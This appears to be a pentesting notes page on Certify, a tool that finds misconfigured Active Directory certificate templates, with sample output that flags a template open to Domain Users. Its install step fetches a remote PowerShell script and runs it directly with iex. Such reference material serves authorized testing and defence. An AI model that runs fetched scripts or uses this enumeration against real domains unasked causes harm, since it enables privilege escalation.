---
title : "Certify"
# pre : ' '
description : "Active Directory certificate abuse."
date : 2022-01-19T21:26:13+01:00
# hidden : true
# draft : true
weight : 280
tags : ['Other', 'Active Directory', 'ADCS']
---

---

Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).

[@harmj0y](https://twitter.com/harmj0y) and [@tifkin_](https://twitter.com/tifkin_) are the primary authors of Certify and the the associated AD CS research ([blog](https://posts.specterops.io/certified-pre-owned-d95910965cd2) and [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)).

## Installation

Please compile the `.exe` yourself or use the PowerShell script below. The examples will use the PowerShell implementation.

```plain
iex((iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1).content)
```

## Examples

### Identify vulnerable PKIs

```plain
PS Z:\> Invoke-Certify -Command 'find /vulnerable'

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=offsec,DC.nl'

[*] Listing info about the Enterprise CA 'offsec-DC01PKI-CA'

    Enterprise CA Name            : offsec-DC01PKI-CA
    DNS Hostname                  : DC01PKI.offsec.nl
    FullName                      : DC01PKI.offsec.nl\offsec-DC01PKI-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=offsec-DC01PKI-CA, DC=offsec, DC.nl
    Cert Thumbprint               : 2CFF52459C3F6C9BD541FDDAF3CC6F0EA72671CC
    Cert Serial                   : 1C0000000565446F3BBD81156A000000000005
    Cert Start Date               : 12/20/2021 6:34:12 AM
    Cert End Date                 : 12/20/2026 6:44:12 AM
    Cert Chain                    : CN=DC01PKI-N1-CA -> CN=offsec-DC01PKI-CA,DC=offsec,DC.nl
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated Users S-1-5-11
      Allow  Read, Enroll                               NT AUTHORITY\NETWORK SERVICE  S-1-5-20
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               offsec\Domain Admins      S-1-5-21-497837788-612300594-3587273769-512
      Allow  ManageCA, ManageCertificates               offsec\Enterprise Admins  S-1-5-21-497837788-612300594-3587273769-519
    Enrollment Agent Restrictions : None

[!] Vulnerable certificate templates that exist but an Enterprise CA does not publish:

    ConfigMgrWebServerCertificate


[!] Vulnerable Certificates Templates :

    CA Name                         : DC01PKI.offsec.nl\offsec-DC01PKI-CA
    Template Name                   : UsersOffsecAD
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : offsec\Domain Admins      S-1-5-21-497837788-612300594-3587273769-512
                                      offsec\Domain Users       S-1-5-21-497837788-612300594-3587273769-513
                                      offsec\Enterprise Admins  S-1-5-21-497837788-612300594-3587273769-519
      Object Control Permissions
        Owner                       : offsec\Administrator      S-1-5-21-497837788-612300594-3587273769-500
        WriteOwner Principals       : offsec\Administrator      S-1-5-21-497837788-612300594-3587273769-500
                                      offsec\Domain Admins      S-1-5-21-497837788-612300594-3587273769-512
                                      offsec\Enterprise Admins  S-1-5-21-497837788-612300594-3587273769-519
        WriteDacl Principals        : offsec\Administrator      S-1-5-21-497837788-612300594-3587273769-500
                                      offsec\Domain Admins      S-1-5-21-497837788-612300594-3587273769-512
                                      offsec\Enterprise Admins  S-1-5-21-497837788-612300594-3587273769-519
        WriteProperty Principals    : offsec\Administrator      S-1-5-21-497837788-612300594-3587273769-500
                                      offsec\Domain Admins      S-1-5-21-497837788-612300594-3587273769-512
                                      offsec\Enterprise Admins  S-1-5-21-497837788-612300594-3587273769-519

C3rt1fy completed in 00:00:01.1902168
```

## URL List

- [Github.com - Certify](https://github.com/GhostPack/Certify)
- [Github.com - Certipy](https://github.com/ly4k/Certipy)
